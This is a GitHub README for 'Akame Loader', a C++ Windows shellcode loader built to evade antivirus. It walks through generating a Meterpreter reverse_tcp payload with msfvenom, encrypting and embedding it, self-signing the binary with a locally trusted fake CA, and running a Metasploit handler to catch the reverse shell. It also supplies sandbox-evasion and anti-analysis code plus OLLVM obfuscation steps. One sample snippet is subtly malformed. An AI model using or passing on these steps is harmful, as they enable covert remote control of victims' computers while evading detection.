<h1 align="center">Akame Loader</h1>
<p align="center">
  <img width="250" height="250" src="https://raw.githubusercontent.com/N3agu/Akame-Loader/main/Images/akame.png" width="250" height="250">
</p>
<h4 align="center">An open source, UD (3/71) shellcode loader written in C++</h4>

## Details
Icon: https://icon-icons.com/icon/Halloween-eye/109170
| Name | Details |
| ------ | ------ |
| Name | Akame Loader |
| Author | N3agu |
| Language | C++ |
| Platform | Windows |
| Version | 1.1 |
| License | MIT |
| Libraries | kernel32, advapi32, crypt32 |
| Encryption | AES256 |
| Build | Release |

## How does it work?
1. Uses WINAPI WinMain so it doesn't popup any console window
2. Checks the current hard disk, if the size is under 100GB it closes itself
3. Sleeps for 10000ms (10s)
4. Checks if any tickcount-related function was manipulated by a sandbox (by checking the hashes and comparing the time slept with the time elapsed on the machine), if something seems wrong, it closes itself
5. Stores the IV, the encryption Key, and the encrypted payload as buffers
6. Allocates a memory buffer for the payload
7. Decrypts the payload (AES256) and closes itself if something doesn't work correctly
8. Copies the payload to a new buffer
9. Marks the memory space as executable (This is not done during the first allocation because it's suspicious to create a memory space which is ReadWriteExecute)
10. Executes the payload

## How to build?
**1. Generate shellcode<br>**
- Metasploit: <br>
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=*IP* LPORT=*PORT* -f raw > shellcode.bin
- Native PE: <br>
use [pe_to_shellcode](https://github.com/hasherezade/pe_to_shellcode) to generate the shellcode
- Managed PE: <br>
use [donut](https://github.com/TheWover/donut) to generate the shellcode

**2. Encrypt your shellcode with encrypt.exe<br>**
- Metasploit: <br>
`mv shellcode.bin \Akame Loader\x64\Release\Resources\` <br>
`cd \Akame Loader\x64\Release\Resources\` <br>
`encrypt --help (optional, to view the manual)`<br>
`encrypt.exe -l cpp -m file -i shellcode.bin -e random -o cli`<br>
- Other: <br>
Use a python script ([example](https://github.com/djackreuter/shellcode-encryption)) to encrypt the shellcode with AES256.

**3. Copy the output and paste it under the "payload" comment<br>**
- Paste your IV Key, your KEY and your shellcode into the existent buffers<br>

**4. Change the resources<br>**
- Add your icon, your company name, etc.

**5. Build the project<br>**
- Platform Toolset: Visual Studio 2022 (v143)<br>
- Language standard: ISO C++17<br>
- Optimization: /O2 <br>
- Configuration: Release<br>
- Platform: x64<br>
- Runtime Library: Multi-Threaded (/MT)<br>
- SubSystem: Windows<br>
- Dependencies: user32.lib;advapi32.lib;crypt32.lib;<br>
- Generate debug info: No
  
**6. Add a certificate to your executable<br>**
  ! Change "Akame.exe" to your executable and AkameCert/AkameCA to whatever you want<br>
- `move Akame.exe Resources && cd Resources`<br>
- `makecert.exe -r -pe -n "CN=Akame CA" -ss CA -sr CurrentUser -a sha256 -cy authority -sky signature -sv AkameCA.pvk AkameCA.cer`<br>
- `certutil -user -addstore Root AkameCA.cer`<br>
- `makecert.exe -pe -n "CN=Akame Cert" -a sha256 -cy end -sky signature -ic AkameCA.cer -iv AkameCA.pvk -sv AkameCert.pvk AkameCert.cer`<br>
- `pvk2pfx.exe -pvk AkameCert.pvk -spc AkameCert.cer -pfx AkameCert.pfx`<br>
- `signtool.exe sign /v /f AkameCert.pfx /t http://timestamp.digicert.com/?alg=sha1 Akame.exe`
  
**7. Listen for incomming connections<br>**
- Metasploit:<br>
`msfconsole -q`<br>
`use exploit/multi/handler`<br>
`set payload windows/x64/meterpreter/reverse_tcp`<br>
`show options` (optional)<br>
`set LHOST *IP*`<br>
`set LPORT *PORT*`<br>
`exploit`<br>
- Other:<br>
start listening for connections

## Video POC
Platform: Windows 10 x64 <br>
Antivirus: Windows Defender 24/10/2022 <br>
<video src='https://user-images.githubusercontent.com/78364462/197958813-9075bdca-2154-47e2-a7a9-52a7d62bbb4c.mp4'></video>
! 720p because I can't upload video files bigger than 10MB on github <br>
! Blackscreens in the video caused by UAC

## VirusTotal Scan (3/71 security vendors and no sandboxes on 24/10/2022)
I uploaded the loader to Virus Total because I don't want this to be used for malicious purposes!<br>
The shellcode used was generated with metasploit (payload: windows/x64/meterpreter/reverse_tcp) and encrypted by \resources\encrypt.exe.<br>
The loader was build with VS22 and signed with a sha1 certificate

<details open>
  <summary>File Scan</summary>
  <img src="https://raw.githubusercontent.com/N3agu/Akame-Loader/main/Images/virustotal1.png">
</details>
<details>
  <summary>File Details</summary>
  <img src="https://raw.githubusercontent.com/N3agu/Akame-Loader/main/Images/virustotal.png">
</details>
Link: https://www.virustotal.com/gui/file/68e6a25457093584a043ed3f721be9bc9b6456edd792cb4e30054e85bdc4119f
</br><b>! Attention, the reason the loader gets a lot of detections now is because Virus Total distributes samples, this is completely normal. With simple and small changes you can obtain a new undetectable payload.</b>

## What should be added to make it better?
- Use LLVM obfuscation for anti-signature scanning (Control Flow Flattening, String Encryption, etc.)
1. Install LLVM toolchain and clang compiler for VS 2022, go to Visual Studio -> Modify -> Individual Components:<br>
(`C++ Clang Compiler for Windows` && `MSBuild support for LLVM (clang-cl) toolset`)
2. Install the pre-compiled [OLLVM-17 files](https://github.com/DreamSoule/ollvm17/releases/tag/17.0.6)
3. Navigate to `C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\Llvm\x64\bin` and copy the files that you downloaded from Github and overwrite
4. Copy the following line and add it as "Additional Options" in Configuration Properties -> C/C++ -> Command Line<br>
<img src="https://raw.githubusercontent.com/N3agu/Akame-Loader/main/Images/commandLine.png">

! The provided code is a set of parameters used with LLVM's obfuscation passes, here's a list of each parameter and what it does, parameters taken directly from ollvm-17 repository.<br>
- *bcf*: This parameter is used for fake control flow.<br>
- *bcf_prob*: This parameter sets the false control flow confusion probability, which ranges from 1 to 100, with a default value of 70.<br>
- *bcf_loop*: This parameter sets the number of false control flow repetitions, with no limit and a default value of 2.<br>
- *fla*: This parameter is used for control flow flattening.<br>
- *sub*: This parameter is used for instruction replacement, specifically add/and/sub/or/xor.<br>
- *sub_loop*: This parameter sets the number of instruction substitutions, with no limit and a default value of 1.<br>
- *sobf*: This parameter is used for string obfuscation, but only for narrow characters.`<br>
- *split*: This parameter is used for basic block split.<br>
- *split_num*: This parameter sets the number of splits of the original basic block, with no limit and a default value of 3.<br>
- *ibr*: This parameter is used for indirect branch.<br>
- *icall*: This parameter is used for indirect call, specifically call register.<br>
- *igv*: This parameter is used for indirect global variable.<br>

After that you only need to compile your solution and you will get a fairly large executable but with various flattening, encryption, substitution applied.
Here's what you should get on analyzing the control flow graph with IDA:
<img src="https://raw.githubusercontent.com/N3agu/Akame-Loader/main/Images/graph.png">
<img src="https://raw.githubusercontent.com/N3agu/Akame-Loader/main/Images/graph1.png">

- Create Mutex to avoid running multiple instances of akame on the same machine. POC:
```cpp
    // Check the mutex at the beginning
    if (OpenMutex(MUTEX_ALL_ACCESS, 0, L"MUTEX_RANDOM_STRING"))
        return 0;

    // Create mutex
    CreateMutex(0, 0, L"MUTEX_RANDOM_STRING");
```
- More anti analysis techniques (functions that check for suspicious files, directories, processes, windows' names, etc.). POC:
```cpp
    // A simple hard-disk check is already done, but we can as well check the available RAM / CPU
    
    // If the machine has less than 2048mb (2gb) of ram -> exit 
    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    GlobalMemoryStatusEx(&memoryStatus);
    DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
    if (RAMMB < 2048) return 0;
    
    // If the machine has less than 2 logical processors -> exit
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
    if (numberOfProcessors < 2) return false;
    
    // Check for specific running processes that are usually used in malware analysis, like WireShark, PE-Bear, ProcMon, IDA, X64/X32 DBG, etc.
    PROCESSENTRY32W processEntry = { 0 };
    processEntry.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    WCHAR processName[MAX_PATH + 1];
    if (Process32FirstW(hSnapshot, &processEntry))
    {
      do
      {
        StringCchCopyW(processName, MAX_PATH, processEntry.szExeFile);
        CharUpperW(processName);
        if (wcsstr(processName, L"WIRESHARK.EXE") || wcsstr(processName), L"PE-BEAR.EXE" || ...)
          return 0;
      } while (Process32NextW(hSnapshot, &processEntry));
    }
```
- Encrypt RTTI Info
- Obfuscate PE Sections
- Use Dynamic API Hashing/Resolving
- Adding 'fake' imports to fill the import table and make it look more legitimate

## Properties
**File**
- Name: Akame.exe <br>
- Architecture: x64 <br>
- File size: 170336 bytes <br>

**Hashes**
- MD5: 560e4432cdbf26332fd3795cf3647cb7 <br>
- SHA1: ffd9942abb6dff4467456b06af2e2742427aff46 <br>
- SHA256: 68e6a25457093584a043ed3f721be9bc9b6456edd792cb4e30054e85bdc4119f

**Table of Imports**
<details>
  <summary>- ADVAPI32.dll: 9 functions</summary>
CryptAcquireContextW, 194<br>
CryptCreateHash, 196<br>
CryptDecrypt, 197<br>
CryptDeriveKey, 198<br>
CryptDestroyHash, 199<br>
CryptDestroyKey, 200<br>
CryptHashData, 217<br>
CryptReleaseContext, 220<br>
CryptSetKeyParam, 222
</details>
<details>
  <summary>- KERNEL32.dll: 72 functions</summary>
CloseHandle, 137<br>
CreateFileW, 206<br>
CreateThread, 245<br>
DeleteCriticalSection, 276<br>
DeviceIoControl, 292<br>
EnterCriticalSection, 312<br>
ExitProcess, 359<br>
FindClose, 382<br>
FindFirstFileExW, 388<br>
FindNextFileW, 405<br>
FlushFileBuffers, 424<br>
FreeEnvironmentStringsW, 435<br>
FreeLibrary, 436<br>
GetACP, 443<br>
GetCommandLineA, 479<br>
GetCommandLineW, 480<br>
GetConsoleMode, 517<br>
GetConsoleOutputCP, 521<br>
GetCPInfo, 458<br>
GetCurrentProcess, 544<br>
GetCurrentProcessId, 545<br>
GetCurrentThreadId, 549<br>
GetEnvironmentStringsW, 577<br>
GetFileType, 600<br>
GetLastError, 618<br>
GetModuleFileNameW, 637<br>
GetModuleHandleExW, 640<br>
GetModuleHandleW, 641<br>
GetOEMCP, 673<br>
GetProcAddress, 696<br>
GetProcessHeap, 702<br>
GetStartupInfoW, 730<br>
GetStdHandle, 732<br>
GetStringTypeW, 737<br>
GetSystemTimeAsFileTime, 755<br>
GetTickCount64, 786<br>
HeapAlloc, 849<br>
HeapFree, 853<br>
HeapReAlloc, 856<br>
HeapSize, 858<br>
InitializeCriticalSectionAndSpinCount, 875<br>
InitializeSListHead, 879<br>
IsDebuggerPresent, 901<br>
IsProcessorFeaturePresent, 908<br>
IsValidCodePage, 914<br>
LCMapStringW, 952<br>
LeaveCriticalSection, 964<br>
LoadLibraryExW, 970<br>
MultiByteToWideChar, 1014<br>
QueryPerformanceCounter, 1106<br>
RaiseException, 1128<br>
RtlCaptureContext, 1237<br>
RtlLookupFunctionEntry, 1244<br>
RtlUnwindEx, 1250<br>
RtlVirtualUnwind, 1251<br>
SetFilePointerEx, 1331<br>
SetLastError, 1345<br>
SetStdHandle, 1371<br>
SetUnhandledExceptionFilter, 1407<br>
Sleep, 1423<br>
TerminateProcess, 1438<br>
TlsAlloc, 1456<br>
TlsFree, 1457<br>
TlsGetValue, 1458<br>
TlsSetValue, 1459<br>
UnhandledExceptionFilter, 1472<br>
VirtualAlloc, 1497<br>
VirtualProtect, 1503<br>
WaitForSingleObject, 1514<br>
WideCharToMultiByte, 1553<br>
WriteConsoleW, 1572<br>
WriteFile, 1573
</details>

## License
MIT License

Copyright (c) 2024 N3agu

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

## Disclaimer
This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
